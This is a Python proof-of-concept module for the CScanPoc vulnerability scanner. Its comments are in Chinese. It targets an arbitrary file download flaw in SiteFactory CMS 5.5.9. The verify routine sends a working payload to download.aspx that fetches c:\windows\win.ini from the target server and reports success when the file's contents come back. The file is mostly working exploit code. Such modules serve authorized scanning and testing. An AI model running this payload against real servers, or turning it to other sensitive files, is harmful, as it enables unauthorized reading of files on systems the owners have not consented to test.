# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'SiteFactoryCMS_0001'  # 平台漏洞编号，留空
    name = 'SiteFactory CMS任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2015-09-06'  # 漏洞公布时间
    desc = '''
        动易SiteFactory内容管理系统是业界首款基于微软.NET2.0平台，采用ASP.NET 2.0进行分层开发的内容管理系统（Content Management System）。
        SiteFactory CMS 5.5.9 存在任意文件下载漏洞。
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-89337'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'SiteFactoryCMS'  # 漏洞应用名称
    product_version = '5.5.9'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e7fc85db-78d1-4b1f-bc3e-1d40e6b76a83'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/sitefactory/assets/download.aspx?file=c%3a\windows\win.ini'
            verify_url = self.target + payload
            req = requests.get(verify_url)

            if req.status_code == 200 and '[mci extensions]' in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
